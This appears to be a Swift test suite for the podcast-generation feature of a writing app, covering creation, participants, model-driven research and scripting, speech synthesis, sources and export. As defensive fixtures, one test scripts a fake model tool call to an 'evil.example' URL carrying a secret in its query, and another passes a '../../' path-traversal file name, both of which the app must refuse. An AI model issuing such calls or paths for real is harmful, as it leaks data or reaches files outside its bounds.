import AppKit
import Testing
import Foundation
import LLMDProtocol
@testable import LLMDesigner

extension ActionSuites {
@MainActor
@Suite("PodcastStudio: Podcasts, Teilnehmer, Erzeugen", .serialized)
struct PodcastActionTests {
    let h = ActionHarness()

    /// A new podcast with a unique title, so tests don't meet each other's.
    private func make(_ extra: [String: JSONValue] = [:]) async throws -> String {
        var args: [String: JSONValue] = ["title": .string("Podcast \(UUID().uuidString)"), "question": "Was ist Predictive Coding?"]
        args.merge(extra) { $1 }
        return try #require(try await h.call("podcast.create", .object(args))["id"]?.stringValue)
    }

    private func podcast(_ id: String) -> Podcast? { h.app.podcasts.podcast(UUID(uuidString: id)!) }

    /// The stand-in for the model and for Qwen TTS, for the time of `body`.
    private func withServer(_ script: [FakeLLMServer.Turn] = [], completions: [String] = [], _ body: (FakeLLMServer) async throws -> Void) async throws {
        let server = try FakeLLMServer(script: script)
        server.completions = completions
        let old = h.app.endpoint
        let oldSpeech = h.app.podcastSpeechServer
        h.app.endpoint = server.endpoint
        h.app.podcastSpeechServer = URL(string: server.endpoint)!
        await h.app.refreshModels()
        defer {
            h.app.endpoint = old
            h.app.podcastSpeechServer = oldSpeech
            server.stop()
        }
        try await body(server)
    }

    private func waitUntilDone(_ id: String, seconds: Double = 30) async throws {
        let deadline = Date().addingTimeInterval(seconds)
        while podcast(id)?.phase.isRunning == true, Date() < deadline {
            try await Task.sleep(for: .milliseconds(50))
        }
        #expect(podcast(id)?.phase.isRunning == false, "läuft noch: \(String(describing: h.app.podcastProgress[UUID(uuidString: id)!]))")
    }

    // MARK: Podcasts

    @Test func createReadUpdateAndDelete() async throws {
        let id = try await make(["minutes": 5])
        let made = try #require(podcast(id))
        #expect(made.minutes == 5)
        #expect(made.speechModel == .small)
        #expect(made.participants.map(\.role) == [.moderator, .discussant, .discussant])
        #expect(Set(made.participants.map(\.voice)).count == 3)
        #expect(made.phase == .draft)

        let read = try await h.call("podcast.read", ["podcast": .string(id)])
        #expect(read["question"] == "Was ist Predictive Coding?")
        #expect(read["status"]?["phase"] == "entwurf")
        #expect(read["status"]?["targetWords"] == 700)
        #expect(read["participants"]?[0]?["role"] == "moderator")
        #expect(try await h.call("podcast.read", ["podcast": .string(made.displayTitle)])["id"] == .string(id))
        let listed = try await h.call("podcast.list", ["query": .string(made.displayTitle)])
        #expect(listed["podcasts"]?.arrayValue?.compactMap { $0["id"]?.stringValue } == [id])

        try await h.call("podcast.update", ["podcast": .string(id), "minutes": 15, "speechModel": "gross"])
        #expect(podcast(id)?.minutes == 15)
        #expect(podcast(id)?.speechModel == .large)
        #expect(await h.errorCode("podcast.update", ["podcast": .string(id), "minutes": 7]) == RPCError.invalidParamsCode)
        #expect(await h.errorCode("podcast.update", ["podcast": .string(id)]) == RPCError.invalidParamsCode)
        try await h.call("writer.edit.undo")
        #expect(podcast(id)?.minutes == 5)

        // The folder lands in the Trash and comes back with ⌘Z.
        let folder = h.app.podcasts.store.folder(of: UUID(uuidString: id)!)
        h.app.podcasts.saveNow(UUID(uuidString: id)!)
        try await h.call("podcast.delete", ["podcast": .string(id)])
        #expect(podcast(id) == nil)
        #expect(!FileManager.default.fileExists(atPath: folder.path))
        #expect(await h.errorCode("podcast.read", ["podcast": .string(id)]) == RPCError.notFoundCode)
        try await h.call("writer.edit.undo")
        #expect(podcast(id)?.minutes == 5)
        #expect(FileManager.default.fileExists(atPath: folder.appendingPathComponent(PodcastStore.recordName).path))
    }

    @Test func aPodcastAboutADocumentOrAPart() async throws {
        let doc = try await h.document("# Vorhersagende Gehirne\n\nDas Gehirn sagt Sinnesreize voraus.")
        let made = try #require(try await h.call("podcast.create", ["doc": .string(doc)])["id"]?.stringValue)
        let about = try #require(podcast(made))
        #expect(about.references == [.document(UUID(uuidString: doc)!)])
        #expect(about.question.contains("Vorhersagende Gehirne") || about.question.contains("Test "))
        #expect(h.app.podcastReferenceText(about.references).contains("Sinnesreize"))

        let world = try #require(try await h.call("stories.world.create", ["title": .string("Welt \(UUID().uuidString)")])["id"]?.stringValue)
        try await h.call("stories.outline.create", ["world": .string(world), "outline": [["title": "Buch", "children": [["title": "Akt"]]]]])
        try await h.call("podcast.reference.add", ["podcast": .string(made), "world": .string(world), "part": "Buch/Akt"])
        let read = try await h.call("podcast.read", ["podcast": .string(made)])
        #expect(read["references"]?[1]?["kind"] == "romanwelt")
        #expect(read["references"]?[1]?["title"]?.stringValue?.hasSuffix("› Akt") == true)
        #expect(try await h.call("podcast.reference.add", ["podcast": .string(made), "doc": .string(doc)])["message"] == "War schon dabei.")
        #expect(await h.errorCode("podcast.reference.add", ["podcast": .string(made), "doc": .string(doc), "world": .string(world)]) == RPCError.invalidParamsCode)

        try await h.call("podcast.reference.remove", ["podcast": .string(made), "doc": .string(doc)])
        #expect(podcast(made)?.references.count == 1)
        #expect(await h.errorCode("podcast.reference.remove", ["podcast": .string(made), "doc": .string(doc)]) == RPCError.invalidTargetCode)
    }

    // MARK: Participants

    @Test func participantsAreSetByHand() async throws {
        let id = try await make(["participants": [
            ["name": "Ada", "description": "Physikerin", "voice": "sohee"],
            ["name": "Tom", "description": "Taxifahrer", "position": "hält alles für Hype"],
        ]])
        #expect(podcast(id)?.participants.map(\.role) == [.moderator, .discussant])
        #expect(podcast(id)?.participants[0].voice == "sohee")

        let added = try await h.call("podcast.participant.add", ["podcast": .string(id), "name": "Bea", "description": "Biologin"])
        #expect(added["role"] == "diskutant")
        #expect(added["voice"]?.stringValue != "sohee")
        #expect(await h.errorCode("podcast.participant.add", ["podcast": .string(id), "name": "ada"]) == RPCError.invalidTargetCode)
        #expect(await h.errorCode("podcast.participant.add", ["podcast": .string(id), "name": "Kai", "role": "moderator"]) == RPCError.invalidTargetCode)

        // Making Bea the moderator makes Ada a discussant.
        try await h.call("podcast.participant.update", ["podcast": .string(id), "participant": "Bea", "role": "moderator", "position": "neutral"])
        #expect(podcast(id)?.moderator?.name == "Bea")
        #expect(podcast(id)?.participants.first { $0.name == "Ada" }?.role == .discussant)
        try await h.call("podcast.participant.remove", ["podcast": .string(id), "participant": "Tom"])
        #expect(podcast(id)?.participants.map(\.name) == ["Ada", "Bea"])
        try await h.call("writer.edit.undo")
        #expect(podcast(id)?.participants.count == 3)

        let voices = try await h.call("podcast.voices.list")
        #expect(voices["voices"]?.arrayValue?.isEmpty == false)
        #expect(voices["speechModels"] == ["klein", "gross"])
    }

    @Test func theModelProposesACast() async throws {
        let id = try await make()
        let cast = #"{"fachgebiet":"Neurowissenschaft","teilnehmer":[{"rolle":"moderator","name":"Nora","beschreibung":"Wissenschaftsjournalistin","position":"neugierig","geschlecht":"weiblich"},"# +
            #"{"rolle":"diskutant","name":"Paul","beschreibung":"Neurowissenschaftler","position":"dafür","geschlecht":"männlich"},"# +
            #"{"rolle":"diskutant","name":"Ines","beschreibung":"Philosophin","position":"skeptisch","geschlecht":"weiblich"}]}"#
        try await withServer(completions: [cast]) { server in
            let answer = try await h.call("podcast.participants.suggest", ["podcast": .string(id)])
            #expect(answer["participants"]?.arrayValue?.compactMap { $0["name"]?.stringValue } == ["Nora", "Paul", "Ines"])
            #expect(server.seenCompletions.first?["response_format"]?["json_schema"]?["name"] == "besetzung")
        }
        #expect(Set(podcast(id)?.participants.map(\.voice) ?? []).count == 3)
        try await h.call("writer.edit.undo")
        #expect(podcast(id)?.participants.first?.name == "Lena")
    }

    // MARK: Making a podcast

    private static let section = """
    Lena: Herzlich willkommen, heute sprechen wir über Predictive Coding, und ich habe zwei Gäste bei mir im Studio.
    Jonas: Danke, Lena. Predictive Coding sagt, dass das Gehirn ständig vorhersagt, was als Nächstes kommt.
    Mira: Das klingt elegant, Jonas, aber viele Befunde lassen sich auch anders erklären, und das sollten wir sagen.
    Lena: Mira, was genau stört dich an dieser Idee, wenn du an die Forschung der letzten Jahre denkst?
    """

    @Test func generateResearchesWritesAndSpeaks() async throws {
        let id = try await make(["minutes": 5])
        // Research: the model tries a page no search returned (refused), answers too early (asked to look further),
        // then writes the fact sheet. Then the plan and three sections, the first one continued once.
        let script: [FakeLLMServer.Turn] = [
            .tools([("open_page", #"{"url":"https://evil.example/?d=geheim"}"#)]),
            .text("Kurz gesagt: Vorhersagen."),
            .text("## Kernaussagen\n- Das Gehirn bildet Vorhersagen und vergleicht sie mit den Sinnesdaten."),
            .text("# Das vorhersagende Gehirn\n## Einstieg\n- Begrüßung\n## Streit\n- Belege\n## Fazit\n- Abschied"),
            .text(Self.section), .text(Self.section), .text(Self.section), .text(Self.section), .text(Self.section), .text(Self.section),
        ]
        try await withServer(script) { server in
            server.fallback = Self.section
            let started = try await h.call("podcast.generate", ["podcast": .string(id)])
            #expect(["wartet", "recherche"].contains(started["phase"]?.stringValue ?? ""))
            #expect(await h.errorCode("podcast.generate", ["podcast": .string(id)]) == RPCError.invalidTargetCode)
            try await waitUntilDone(id)

            let made = try #require(podcast(id))
            #expect(made.phase == .finished, "\(made.error ?? "")")
            #expect(made.title.hasPrefix("Podcast "))
            #expect(made.research.notes.contains("Kernaussagen"))
            #expect(made.research.sources.isEmpty)
            #expect(made.outline.map(\.title) == ["Einstieg", "Streit", "Fazit"])
            #expect(made.script.count >= 12)
            #expect(Set(made.script.map(\.speaker)) == Set(made.participants.map(\.id)))
            #expect(made.script.allSatisfy { $0.duration != nil })
            #expect((made.duration ?? 0) > 10)
            #expect(h.app.isPodcastAudioCurrent(made))

            // The research asked with thinking on and the web and Wikipedia tools; the forged address was refused.
            let research = server.requests[1]
            let toolNames = research["tools"]?.arrayValue?.compactMap { $0["function"]?["name"]?.stringValue } ?? []
            #expect(Set(toolNames) == ["web_search", "open_page", "wikipedia_search", "wikipedia_article"])
            let toolAnswer = research["messages"]?.arrayValue?.last { $0["role"] == "tool" }?["content"]?.stringValue ?? ""
            #expect(toolAnswer.hasPrefix("Nicht geöffnet"))
            #expect(server.requests[2]["messages"]?.arrayValue?.last?["content"]?.stringValue == PodcastPrompts.researchNudge)
            // Each speaker is spoken in their own voice, in German, with the small model.
            let spoken = server.spoken
            #expect(spoken.count >= made.script.count)
            #expect(spoken.allSatisfy { $0["model"] == "qwen3-tts-small" && $0["language"] == "de" })
            #expect(Set(spoken.compactMap { $0["voice"]?.stringValue }) == Set(made.participants.map(\.voice)))
        }

        let status = try await h.call("podcast.status", ["podcast": .string(id)])
        #expect(status["percent"] == 100)
        #expect(status["audioCurrent"] == true)

        // A changed line loses its snippet; the audio is no longer current until it is spoken again.
        try await h.call("podcast.line.update", ["podcast": .string(id), "line": "2", "text": "Danke, Lena, das ist eine gute Frage für den Anfang unserer Sendung."])
        let line = try #require(podcast(id)?.script[1])
        #expect(line.duration == nil)
        #expect(!h.app.podcasts.store.hasSnippet(of: UUID(uuidString: id)!, line: line.id))
        #expect(try await h.call("podcast.status", ["podcast": .string(id)])["audioCurrent"] == false)
        #expect(await h.errorCode("podcast.line.update", ["podcast": .string(id), "line": "999", "text": "x"]) == RPCError.notFoundCode)

        try await withServer { server in
            try await h.call("podcast.generate", ["podcast": .string(id), "from": "fortsetzen"])
            try await waitUntilDone(id)
            #expect(server.spoken.count == 1)
            #expect(server.requests.isEmpty)
        }
        #expect(podcast(id).map(h.app.isPodcastAudioCurrent) == true)

        // Export to a file of the test (the export folder would be the person's own), play and pause in the app.
        let target = FileManager.default.temporaryDirectory.appendingPathComponent("podcast-\(UUID().uuidString).m4a")
        let exported = try await h.call("podcast.export", ["podcast": .string(id), "path": .string(target.path)])
        let path = try #require(exported["path"]?.stringValue)
        #expect(path.hasSuffix(".m4a"))
        #expect(FileManager.default.fileExists(atPath: path))
        try? FileManager.default.removeItem(atPath: path)
        try await h.call("podcast.play", ["podcast": .string(id), "line": "3"])
        #expect(h.app.podcastPlayer.isPlaying)
        // The player says which line is spoken, so the script only redraws when it changes.
        #expect(h.app.podcastPlayer.currentLine == podcast(id)?.script[2].id)
        #expect(h.app.podcastPlayer.currentTime > 0)
        try await h.call("podcast.play", ["podcast": .string(id), "pause": true])
        #expect(!h.app.podcastPlayer.isPlaying)
        h.app.podcastPlayer.stop()
    }

    @Test func withoutTheVoiceServiceItFailsAndCanGoOn() async throws {
        let id = try await make(["minutes": 5])
        try await withServer([.text("## Kernaussagen\n- Fakt."), .text("## Kernaussagen\n- Fakt.")]) { server in
            server.fallback = Self.section
            h.app.podcastSpeechServer = URL(string: "http://127.0.0.1:9")!
            try await h.call("podcast.generate", ["podcast": .string(id)])
            try await waitUntilDone(id)
        }
        let failed = try #require(podcast(id))
        #expect(failed.phase == .failed)
        #expect(failed.error?.contains("Qwen-TTS") == true)
        #expect(!failed.script.isEmpty)
        #expect(await h.errorCode("podcast.generate", ["podcast": .string(id), "from": "nirgends"]) == RPCError.invalidParamsCode)
        #expect(await h.errorCode("podcast.export", ["podcast": .string(id)]) == RPCError.invalidTargetCode)

        // Deleting a line works on the stopped podcast; ⌘Z brings it back.
        let count = failed.script.count
        try await h.call("podcast.line.delete", ["podcast": .string(id), "line": "1"])
        #expect(podcast(id)?.script.count == count - 1)
        try await h.call("writer.edit.undo")
        #expect(podcast(id)?.script.count == count)
    }

    // MARK: Thinking, tone, own sources, Writer

    @Test func thinkingAndToneAreSet() async throws {
        let id = try await make(["thinking": false, "tone": "polemisch"])
        #expect(podcast(id)?.thinking == false)
        #expect(podcast(id)?.tone == .polemic)
        try await h.call("podcast.update", ["podcast": .string(id), "tone": "hitzig", "thinking": true])
        #expect(podcast(id)?.tone == .heated)
        #expect(podcast(id)?.thinking == true)
        #expect(await h.errorCode("podcast.update", ["podcast": .string(id), "tone": "lauwarm"]) == RPCError.invalidParamsCode)
        let read = try await h.call("podcast.read", ["podcast": .string(id)])
        #expect(read["tone"] == "hitzig")
        #expect(read["thinking"] == true)
        try await h.call("writer.edit.undo")
        #expect(podcast(id)?.tone == .polemic)
    }

    /// A one-page PDF with real text, as a test file.
    private func makePDF(_ text: String) throws -> URL {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("Podcast-Quelle-\(UUID().uuidString.prefix(6)).pdf")
        var box = CGRect(x: 0, y: 0, width: 595, height: 842)
        let context = try #require(CGContext(url as CFURL, mediaBox: &box, nil))
        context.beginPDFPage(nil)
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(cgContext: context, flipped: false)
        NSAttributedString(string: text, attributes: [.font: NSFont.systemFont(ofSize: 12)]).draw(in: CGRect(x: 50, y: 50, width: 495, height: 740))
        NSGraphicsContext.restoreGraphicsState()
        context.endPDFPage()
        context.closePDF()
        return url
    }

    @Test func ownSourcesAreAddedAndRemoved() async throws {
        let id = try await make()
        let pdf = try makePDF("Die Studie zeigt, dass Igel im Winter bis zu dreißig Prozent ihres Gewichts verlieren.")
        defer { try? FileManager.default.removeItem(at: pdf) }
        try await h.call("podcast.source.add", ["podcast": .string(id), "url": "example.org/igel"])
        try await h.call("podcast.source.add", ["podcast": .string(id), "pdf": .string(pdf.path), "onlySources": true])
        let sources = try #require(podcast(id)?.ownSources)
        #expect(sources.onlyThese)
        #expect(sources.entries.first == .url("https://example.org/igel"))
        guard case .pdf(_, let file) = sources.entries.last else { Issue.record("kein PDF"); return }
        #expect(file.hasPrefix("Quellen/"))
        let copy = try #require(h.app.podcasts.store.sourceURL(of: UUID(uuidString: id)!, file: file))
        #expect(FileManager.default.fileExists(atPath: copy.path))
        let text = await h.app.readOwnSources(try #require(podcast(id)), limit: 10_000).text
        #expect(text.contains("dreißig Prozent"))
        #expect(await h.errorCode("podcast.source.add", ["podcast": .string(id), "url": "kein web"]) == RPCError.invalidParamsCode)
        #expect(await h.errorCode("podcast.source.add", ["podcast": .string(id)]) == RPCError.invalidParamsCode)
        #expect(h.app.podcasts.store.sourceURL(of: UUID(uuidString: id)!, file: "../../geheim.pdf") == nil)

        try await h.call("podcast.source.remove", ["podcast": .string(id), "source": "2"])
        #expect(podcast(id)?.ownSources.entries.count == 1)
        #expect(!FileManager.default.fileExists(atPath: copy.path))
        // "Nur diese" without any source can't start.
        try await h.call("podcast.source.remove", ["podcast": .string(id), "source": "https://example.org/igel"])
        #expect(await h.errorCode("podcast.generate", ["podcast": .string(id)]) == RPCError.invalidTargetCode)
    }

    @Test func onlyOwnSourcesMeansNoSearchAndAHeatedScript() async throws {
        let id = try await make(["minutes": 5, "tone": "hitzig", "thinking": false])
        let fact = "## Kernaussagen\n- Igel verlieren im Winterschlaf bis zu dreißig Prozent ihres Gewichts (Quelle: Igelstudie)."
        try await withServer([.text(fact), .text("## Einstieg\n- Begrüßung\n## Streit\n- Gewicht\n## Fazit\n- Ende")]) { server in
            server.fallback = Self.section
            server.page = "<html><head><title>Igelstudie</title></head><body><p>" + String(repeating: "Igel halten Winterschlaf und verlieren dabei bis zu dreißig Prozent ihres Gewichts. ", count: 12) + "</p></body></html>"
            try await h.call("podcast.source.add", ["podcast": .string(id), "url": .string(server.endpoint + "/artikel"), "onlySources": true])
            try await h.call("podcast.generate", ["podcast": .string(id)])
            try await waitUntilDone(id)

            let made = try #require(podcast(id))
            #expect(made.phase == .finished, "\(made.error ?? "")")
            #expect(made.research.notes == fact)
            #expect(made.research.sources.map(\.title) == ["Igelstudie"])
            // The fact sheet came from the page alone: no tools were offered, the page text was in the request.
            let research = server.requests[0]
            #expect(research["tools"] == nil)
            let asked = research["messages"]?.arrayValue?.compactMap { $0["content"]?.stringValue }.joined() ?? ""
            #expect(asked.contains("dreißig Prozent"))
            #expect(asked.contains("Ergänze nichts aus eigenem Wissen"))
            // The script was asked for a heated quarrel that keeps to the sources.
            let section = server.requests[2]["messages"]?[0]?["content"]?.stringValue ?? ""
            #expect(section.contains("Alice Schwarzer"))
            #expect(section.contains("nur, was in den mitgelieferten Quellen steht"))
            #expect(server.requests[2]["temperature"] == .double(0.9))
        }

        // The podcast as a Writer document, foreign because of the page; ⌘Z takes it away.
        let made = try await h.call("podcast.toDocument", ["podcast": .string(id)])
        let doc = try #require(made["id"]?.stringValue)
        let markdown = h.text(doc)
        #expect(markdown.contains("## Teilnehmer"))
        #expect(markdown.contains("## Gespräch"))
        #expect(markdown.contains("**Lena:** Herzlich willkommen"))
        #expect(markdown.contains("### Kernaussagen"))
        #expect(markdown.contains("*Ton:* Hitzig"))
        #expect(h.app.document(UUID(uuidString: doc)!)?.provenance == .foreign)
        try await h.call("writer.edit.undo")
        #expect(h.app.document(UUID(uuidString: doc)!) == nil)
    }

    @Test func generateNeedsACast() async throws {
        let id = try await make(["participants": [["name": "Solo"]]])
        #expect(await h.errorCode("podcast.generate", ["podcast": .string(id)]) == RPCError.invalidTargetCode)
        #expect(await h.errorCode("podcast.generate", ["podcast": .string(id), "from": "skript"]) == RPCError.invalidTargetCode)
        #expect(await h.errorCode("podcast.create", [:]) == RPCError.invalidParamsCode)
    }

    @Test func studioOpensAndCloses() async throws {
        let id = try await make()
        try await h.call("podcast.studio.open", ["podcast": .string(id)])
        #expect(h.app.podcastStudioOpen)
        #expect(h.app.selectedPodcastID?.uuidString == id)
        #expect(h.app.activeApplication == .podcast)
        try await h.call("podcast.studio.close")
        #expect(!h.app.podcastStudioOpen)
    }

    @Test func descriptorsFollowTheRules() {
        let podcast = h.registry.descriptors.filter { $0.module == "podcast" }
        #expect(podcast.count == 24)
        let byID = Dictionary(uniqueKeysWithValues: podcast.map { ($0.id, $0) })
        #expect(byID["podcast.source.remove"]?.kind == .destructive)
        #expect(byID["podcast.toDocument"]?.security.effect == .local)
        #expect(byID["podcast.read"]?.security.readsUntrusted == true)
        #expect(byID["podcast.list"]?.security.readsUntrusted == true)
        #expect(byID["podcast.export"]?.security.effect == .outbound)
        #expect(byID["podcast.delete"]?.kind == .destructive)
        for member in ChatToolGroups.members["podcast.core"] ?? [] { #expect(byID[member] != nil, "\(member)") }
        #expect(QuickBarTools.groups(for: "Mach mir einen Podcast über Schwarze Löcher") == ["podcast.core"])
    }
}
}

/// `result["participants"]?[0]?["role"]`: reading nested results the way they look.
private extension JSONValue {
    subscript(index: Int) -> JSONValue? {
        guard let array = arrayValue, array.indices.contains(index) else { return nil }
        return array[index]
    }
}
